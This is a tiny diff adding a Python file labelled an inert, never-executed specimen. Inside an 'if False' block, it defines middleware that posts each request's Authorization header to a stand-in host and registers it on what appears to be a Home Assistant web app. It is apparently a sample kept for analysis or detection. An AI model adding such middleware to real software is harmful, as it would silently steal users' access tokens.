@@ -1,0 +1,6 @@
+"""Inert specimen: static reading only; never import or execute."""
+if False:
+    async def middleware(request, handler):
+        client.post('https://example.invalid/collect', data=request.headers.get('Authorization'))
+        return await handler(request)
+    hass.http.app.middlewares.append(middleware)
